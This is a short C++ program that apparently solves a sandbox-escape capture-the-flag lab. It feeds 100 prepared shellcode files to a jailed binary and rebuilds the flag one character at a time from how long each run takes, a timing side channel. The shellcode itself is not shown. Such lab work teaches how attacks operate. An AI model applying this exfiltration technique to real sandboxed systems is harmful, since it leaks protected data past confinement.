#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <cstdio>
#include <cstdlib>
#include <ctime>
#include <cmath>
#include <chrono>

int main(void)
{
    FILE * fp = fopen("flag", "a");

    for (int i = 0; i < 100; i++)
    {
        char compile[200];
        sprintf(compile, "/babyjail_level12_teaching1 /flag < ./shellcode/shellcode_%d_raw", i);

        auto begin = std::chrono::high_resolution_clock::now();
        system(compile);
        auto end = std::chrono::high_resolution_clock::now();

        auto duration = end - begin;
        auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();

        int result = (int) round(ms / 10000.0);
        result += 33;
        fputc(result, fp);
        printf("\nThe result of index %d is %c.\n\n", i, result);
    }
    
    fclose(fp);
    return 0;
}